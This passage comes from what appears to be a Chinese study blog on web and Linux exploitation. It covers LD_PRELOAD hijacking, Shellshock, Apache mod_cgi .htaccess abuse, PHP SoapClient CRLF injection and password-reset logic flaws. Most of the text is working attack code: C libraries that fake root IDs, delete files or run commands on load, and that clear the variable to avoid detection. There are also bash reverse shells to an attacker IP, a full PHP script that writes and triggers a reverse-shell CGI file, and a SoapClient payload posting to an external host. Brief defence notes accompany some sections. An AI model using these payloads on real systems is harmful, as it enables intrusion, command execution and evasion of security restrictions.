<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;\n&quot;</span>, s1, s2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 永远返回0，表示两个字符串相等 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们把他变成动态链接库，然后用LD_PRELOAD引用，发现strcmp被我们自创的strcmp代替了，实现了劫持</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210702144058931.png" alt="image-20210702144058931"></p>
<p>做完记得擦屁股【把环境变量删掉】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unset LD_PRELOAD</span><br></pre></td></tr></table></figure>





<h4 id="例子二【修改id】"><a href="#例子二【修改id】" class="headerlink" title="例子二【修改id】"></a>例子二【修改id】</h4><p>创建preload.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uid_t</span> <span class="title function_">geteuid</span><span class="params">( <span class="type">void</span> )</span> &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"><span class="type">uid_t</span> <span class="title function_">getuid</span><span class="params">( <span class="type">void</span> )</span> &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"><span class="type">uid_t</span> <span class="title function_">getgid</span><span class="params">( <span class="type">void</span> )</span> &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc preload.c -shared -o preload.so</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210702145935336.png" alt="image-20210702145935336"></p>
<p>虽然uid变了，但发现仍然无法执行root的命令。</p>
<h4 id="例子三【mail–-gt-sendmail–-gt-getuid-–-gt-LD-PRELOAD】"><a href="#例子三【mail–-gt-sendmail–-gt-getuid-–-gt-LD-PRELOAD】" class="headerlink" title="例子三【mail–&gt;sendmail–&gt;getuid()–&gt;LD_PRELOAD】"></a>例子三【mail–&gt;sendmail–&gt;getuid()–&gt;LD_PRELOAD】</h4><p>首先创建hack.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">	system(<span class="string">&quot;rm -f /tmp/check.txt&quot;</span>);</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="type">int</span>  <span class="title function_">geteuid</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">	unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);		<span class="comment">//删除环境变量，防止被发现</span></span><br><span class="line">	payload();</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hack.c -shared -o hack.so</span><br></pre></td></tr></table></figure>

<p>然后创建一个check.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch check.txt</span><br></pre></td></tr></table></figure>



<p>接着在网站目录下创建mail.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/var/www/html/hack.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后网页上访问mail.php【或者包含】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ag=include(&#x27;mail.php&#x27;);</span><br></pre></td></tr></table></figure>

<p>发现check.txt已经被删除。</p>
<p>这是因为mail函数执行时默认调用系统程序&#x2F;usr&#x2F;sbin&#x2F;<strong>sendmail</strong>，而sendmail又调用了一些函数，比如<strong>getuid()<strong>，其中就包括会触发</strong>LD_PRELOAD</strong>，所以check.txt就被删除了。</p>
<blockquote>
<p>mail函数被禁的话可以试试error_log函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_log(&quot;&quot;,1,&quot;&quot;,&quot;&quot;);</span><br></pre></td></tr></table></figure>
</blockquote>
<p>但是，这还是比较依赖sendmail命令的。系统中可能没有启用sendmail甚至没有安装，因此这样的方法局限性太大。因此我们应该考虑不是<strong>劫持某个函数</strong>，而应考虑<strong>劫持共享对象</strong>。</p>
<h4 id="例子四【共享劫持对象】"><a href="#例子四【共享劫持对象】" class="headerlink" title="例子四【共享劫持对象】"></a>例子四【共享劫持对象】</h4><p>这里无需系统安装sendmail()，只需要使用：GCC 有个 C 语言扩展修饰符 <strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <strong>attribute</strong>((constructor)) 修饰的函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">a1batr0ss</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/readflag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="防范LD-PRELOAD"><a href="#防范LD-PRELOAD" class="headerlink" title="防范LD_PRELOAD"></a>防范LD_PRELOAD</h4><ol>
<li>通过<strong>静态链接</strong>。使用<em>gcc</em>的*-static<em>参数可以把</em>libc.so.6*静态链入执行程序中。但这也就意味着你的程序不再支持动态链接。</li>
<li>通过<strong>设置执行文件的<em>setgid &#x2F; setuid</em>标志</strong>。在有<em>SUID</em>权限的执行文件，系统会忽略<em>LD_PRELOAD</em>环境变量。也就是说，如果你有以<em>root</em>方式运行的程序，最好设置上<em>SUID</em>权限。（如：<em>chmod 4755 daemon</em>）</li>
</ol>
<h3 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h3><h4 id="参考文章-3"><a href="#参考文章-3" class="headerlink" title="参考文章"></a>参考文章</h4><ol>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11203366.html">CVE-2014-6271 Shellshock 破壳漏洞 复现 - tr1ple - 博客园 (cnblogs.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jb51.net/article/169778.htm">深入理解Linux shell中2&gt;&amp;1的含义</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Auuuuuuuu/article/details/89059176">Linux之bash反弹shell原理浅析_Au-CSDN博客</a></li>
</ol>
<h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
<li>bash版本低于4.3</li>
</ol>
<h4 id="例子一【error-log触法环境变量】"><a href="#例子一【error-log触法环境变量】" class="headerlink" title="例子一【error_log触法环境变量】"></a>例子一【error_log触法环境变量】</h4><p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210713221500295.png" alt="image-20210713221500295"></p>
<p>这里利用error_log或者sendmail触发读取环境变量，从而执行tac后面的语句</p>
<h4 id="例子二【结合cgi】【CVE-2014-6271-Shellshock-破壳漏洞】"><a href="#例子二【结合cgi】【CVE-2014-6271-Shellshock-破壳漏洞】" class="headerlink" title="例子二【结合cgi】【CVE-2014-6271 Shellshock 破壳漏洞】"></a>例子二【结合cgi】【CVE-2014-6271 Shellshock 破壳漏洞】</h4><p>关于原理，这里有一篇文章就不错：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/35579956">什么是ShellShock攻击？ - 知乎 (zhihu.com)</a></p>
<p>这里就用vulhub里的.&#x2F;bash&#x2F;shellshock</p>
<p>kali【攻击机】上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2233</span><br></pre></td></tr></table></figure>



<p>首先发现了victim.cgi，bp连一下，然后挑一个HEADER改成以下payload：【推测是因为加载cgi程序时会调用HEADER，也就引发了bash漏洞】</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; <span class="built_in">test</span>;&#125;;<span class="built_in">echo</span>; <span class="built_in">echo</span> shellshock;/bin/bash -i &gt;&amp; /dev/tcp/192.168.33.128/2233 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>关于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.33.128/2233 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<ol>
<li>bash -i创造一个交互bash</li>
<li>linux万物皆文件，这个就是交互的socket端口</li>
<li><code>&gt;&amp;</code>是将标准错误输出【2】依附于标准输出【1】</li>
<li>我们发现，经过<code>&gt;&amp;</code>之后，标准输出和标准错误输出都指向socket，而输入也来自于socket，那么我们就需要标准输入也指向socket，即将标准输入【0】重定向到标准输出【1】&#x2F;或标准错误输出【2】</li>
</ol>
</blockquote>
<p>即可在kali上获得一个交互bash</p>
<h3 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h3><p>任何具有MIME类型application&#x2F;x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是<strong>文件具有已由AddType指令定义的扩展名</strong>，另一种是<strong>文件位于ScriptAlias目录</strong>中。<br>如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。</p>
<h4 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>必须是apache环境</li>
<li>mod_cgi已经启用</li>
<li>必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none</li>
<li>必须有权限写.htaccess文件</li>
</ul>
<h4 id="例子一【-htaccess使文件解析为cgi脚本】"><a href="#例子一【-htaccess使文件解析为cgi脚本】" class="headerlink" title="例子一【.htaccess使文件解析为cgi脚本】"></a>例子一【.htaccess使文件解析为cgi脚本】</h4><p>首先要在&#x2F;etc&#x2F;apache2&#x2F;apache2.conf里把AllowOverride的None改成All</p>
<p>其次我们要使我们的文件解析为cgi脚本：</p>
<ul>
<li><p>临时的方法：在目录下新建.htaccess，内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .ag</span><br></pre></td></tr></table></figure>
</li>
<li><p>永久的方法，在apache2.conf里添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /var/www/html/&gt;</span><br><span class="line">Options +ExecCGI                      #这便是允许cgi程序执行</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>其次在目录下新建需要执行的脚本hack.ag【记得赋予可执行权限】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo&amp;&amp;cd &quot;/var/www/html&quot;;ls -al;echo [S];pwd;echo [E]</span><br></pre></td></tr></table></figure>

<p>如果是要反弹shell，那么就要变成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.33.128/2233 0&gt;&amp;1</span><br></pre></td></tr></table></figure>



<p>接着访问hack.ag，里面的命令就会被执行</p>
<p>附上自动化脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.33.128/2233 0&gt;&amp;1&quot;</span>; <span class="comment">//command to be executed</span></span><br><span class="line"><span class="variable">$shellfile</span> = <span class="string">&quot;#!/bin/bash\n&quot;</span>; <span class="comment">//using a shellscript</span></span><br><span class="line"><span class="variable">$shellfile</span> .= <span class="string">&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;</span>; <span class="comment">//header is needed, otherwise a 500 error is thrown when there is output</span></span><br><span class="line"><span class="variable">$shellfile</span> .= <span class="string">&quot;<span class="subst">$cmd</span>&quot;</span>; <span class="comment">//executing $cmd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkEnabled</span>(<span class="params"><span class="variable">$text</span>,<span class="variable">$condition</span>,<span class="variable">$yes</span>,<span class="variable">$no</span></span>) //<span class="title">this</span> <span class="title">surely</span> <span class="title">can</span> <span class="title">be</span> <span class="title">shorter</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$text</span>: &quot;</span> . (<span class="variable">$condition</span> ? <span class="variable">$yes</span> : <span class="variable">$no</span>) . <span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;checked&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&quot;\nSetEnv HTACCESS on&quot;</span>, FILE_APPEND); <span class="comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] . <span class="string">&#x27;?checked=true&#x27;</span>); <span class="comment">//execute the script again to see if the htaccess test worked</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$modcgi</span> = <span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;mod_cgi&#x27;</span>, <span class="title function_ invoke__">apache_get_modules</span>()); <span class="comment">// mod_cgi enabled?</span></span><br><span class="line">    <span class="variable">$writable</span> = <span class="title function_ invoke__">is_writable</span>(<span class="string">&#x27;.&#x27;</span>); <span class="comment">//current dir writable?</span></span><br><span class="line">    <span class="variable">$htaccess</span> = !<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTACCESS&#x27;</span>]); <span class="comment">//htaccess enabled?</span></span><br><span class="line">        <span class="title function_ invoke__">checkEnabled</span>(<span class="string">&quot;Mod-Cgi enabled&quot;</span>,<span class="variable">$modcgi</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">checkEnabled</span>(<span class="string">&quot;Is writable&quot;</span>,<span class="variable">$writable</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">checkEnabled</span>(<span class="string">&quot;htaccess working&quot;</span>,<span class="variable">$htaccess</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$modcgi</span> &amp;&amp; <span class="variable">$writable</span> &amp;&amp; <span class="variable">$htaccess</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Error. All of the above must be true for the script to work!&quot;</span>; <span class="comment">//abort if not</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">checkEnabled</span>(<span class="string">&quot;Backing up .htaccess&quot;</span>,<span class="title function_ invoke__">copy</span>(<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.htaccess.bak&quot;</span>),<span class="string">&quot;Suceeded! Saved in .htaccess.bak&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//make a backup, cause you never know.</span></span><br><span class="line">        <span class="title function_ invoke__">checkEnabled</span>(<span class="string">&quot;Write .htaccess file&quot;</span>,<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.htaccess&#x27;</span>,<span class="string">&quot;Options +ExecCGI\nAddHandler cgi-script .dizzle&quot;</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//.dizzle is a nice extension</span></span><br><span class="line">        <span class="title function_ invoke__">checkEnabled</span>(<span class="string">&quot;Write shell file&quot;</span>,<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.dizzle&#x27;</span>,<span class="variable">$shellfile</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//write the file</span></span><br><span class="line">        <span class="title function_ invoke__">checkEnabled</span>(<span class="string">&quot;Chmod 777&quot;</span>,<span class="title function_ invoke__">chmod</span>(<span class="string">&quot;shell.dizzle&quot;</span>,<span class="number">0777</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//rwx</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Executing the script now. Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style = &#x27;display:none;&#x27;&gt;&quot;</span>; <span class="comment">//call the script</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>









<h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><h4 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h4><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="php原生类的利用"><a href="#php原生类的利用" class="headerlink" title="php原生类的利用"></a>php原生类的利用</h2><h3 id="参考文章-4"><a href="#参考文章-4" class="headerlink" title="参考文章"></a>参考文章</h3><ol>
<li><a target="_blank" rel="noopener" href="https://www.extrader.top/posts/35c0085d/">php原生类利用 | Extraderの博客</a></li>
</ol>
<h3 id="SoupClient"><a href="#SoupClient" class="headerlink" title="SoupClient"></a>SoupClient</h3><p>结合CRLF【\n\r】</p>
<p>现在139.9.204.165监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5678</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &quot;http://139.9.204.165:5678&quot;;</span><br><span class="line">$post_string = &#x27;data=abc&#x27;;</span><br><span class="line">$headers = array(</span><br><span class="line">    &#x27;X-Forwarded-For: 127.0.0.1&#x27;,</span><br><span class="line">    &#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span><br><span class="line">);</span><br><span class="line">$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;. (string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27;=&gt;&#x27;hello&#x27;));</span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(&#x27;^^&#x27;,&quot;\n\r&quot;,$aaa);</span><br><span class="line">//echo urlencode($aaa);</span><br><span class="line">$c = unserialize($aaa);</span><br><span class="line">$c-&gt;notexists();</span><br></pre></td></tr></table></figure>







<h1 id="逻辑漏洞：任意用户密码重置"><a href="#逻辑漏洞：任意用户密码重置" class="headerlink" title="逻辑漏洞：任意用户密码重置"></a>逻辑漏洞：任意用户密码重置</h1><h2 id="重置凭证泄漏"><a href="#重置凭证泄漏" class="headerlink" title="重置凭证泄漏"></a>重置凭证泄漏</h2><p>在找回密码的response包可能会有一些存在验证码的参数。</p>
<p><strong>邮件链接：</strong></p>
<p>有些时候，发送邮件验证身份的可能会让你点击一个邮箱链接来重置密码，这个链接有时可以从返回包里找出一些规律。</p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>防御措施上，密码找回的凭证切勿下发客户端，</p>
<p>另外，校验邮箱是否有效应添加图片验证码，以防止关键参数被枚举。</p>
<h2 id="重置凭证接收端可篡改"><a href="#重置凭证接收端可篡改" class="headerlink" title="重置凭证接收端可篡改"></a>重置凭证接收端可篡改</h2><p>在发包时将受害者手机或邮箱改为自己的，从而用自己的验证码去重置受害者密码。</p>
<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>一定要将重置用户与接收重置凭证的手机号&#x2F;邮箱作一致性比较，通常直接从<strong>服务端直接生成手机号&#x2F;邮箱</strong>，不从客户端获取。</p>
<h2 id="用户混淆"><a href="#用户混淆" class="headerlink" title="用户混淆"></a>用户混淆</h2><p>修改一些来辨识用户的内容，如token和cookie，来让系统误以为攻击者是受害者的身份</p>
<p><strong>PHPSESSID关联用户的方法</strong></p>
<p>先登录攻击者账号hack，并发送找回密码请求，先不发送到服务端【此时PHPSESSID关联hack】。此时，重新输入受害者账号victim找回密码请求，此时PHPSESSID就关联了victim，此时再将之前拦截的包发出去，因为PHPSESSID关联的是victim，所以此时就可以修改victim的账号。</p>
<h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><p>一定要将重置用户与接收重置凭证作一致性比较，通常直接从<strong>服务端直接生成</strong>，不从客户端获取。</p>
<p>另外，密码找回逻辑中含有用户标识（用户名、用户 ID、cookie）、接收端（手机、邮箱）、凭证（验证码、token）、当前步骤等四个要素，这四个要素必须<strong>完整关联</strong>，否则可能导致任意密码重置漏洞。</p>
<p>另外，HTTP 参数污染、参数未提交等问题，服务端也要严格判断。</p>
<h2 id="重置凭证未校验"><a href="#重置凭证未校验" class="headerlink" title="重置凭证未校验"></a>重置凭证未校验</h2><p>就是重置密码时，验证凭证像token啥的仅仅是摆设，输入啥都可以绕过，从而修改任意用户密码。</p>
<h3 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h3><p>密码重置凭证一定要严格校验，空密保问题时禁止通过密保找回密码；服务端应限制枚举等恶意请求。</p>
<h2 id="重置凭证可暴破"><a href="#重置凭证可暴破" class="headerlink" title="重置凭证可暴破"></a>重置凭证可暴破</h2><p>也就是短信验证码可以爆破</p>
<h3 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h3><p>密码重置凭证强度提高，建议六位数字，有效期十分钟，并且验证码应校验一次后立即作废。另外，服务端应限制枚举等恶意请求。</p>
<h2 id="应答中存在影响后续逻辑的状态参数"><a href="#应答中存在影响后续逻辑的状态参数" class="headerlink" title="应答中存在影响后续逻辑的状态参数"></a>应答中存在影响后续逻辑的状态参数</h2><p>就是服务端将应答包【包含正确或者错误的状态参数】返回到前端进行验证，那么我们就可以抓包拦截返回包，并把状态参数修改为正确的，就可以修改任意用户的密码了。</p>
<h3 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h3><p>服务端校验短信验证码后应通过 cookie 记录状态，不应在前端通过状态参数判断。另外，服务端应限制枚举等恶意请求。</p>
<h2 id="Token可预测"><a href="#Token可预测" class="headerlink" title="Token可预测"></a>Token可预测</h2><p>有些邮箱验证身份的可能会用一个链接，链接里面包含确认你身份的token，这个token有几种构造可能。</p>
<p><strong>token构造可能</strong></p>
<ol>
<li>任意信息组合后md5加密，如md5(id + username)</li>
<li>采用时间戳进行md5加密，这样的可以先攻击者发一个包，然后受害者发一个包，最后攻击者再发一个包，这几个包的发送间隙设置为很短，这样我们可以得到第一次和最后一次攻击者发包的时间戳，那么受害者发包的时间戳就是在两个时间戳之间，那就是可爆破的，这样就可以获得受害者的token从而重置密码了。</li>
<li>递增序列，这个破解的方法同上。</li>
</ol>
<h3 id="防御-6"><a href="#防御-6" class="headerlink" title="防御"></a>防御</h3><p>密码重置链接中 token 尽可能随机化，若用常规加密算法，一定用客户端无法查看且猜测的因子作为盐值。另外，服务端应限制枚举等恶意请求。</p>
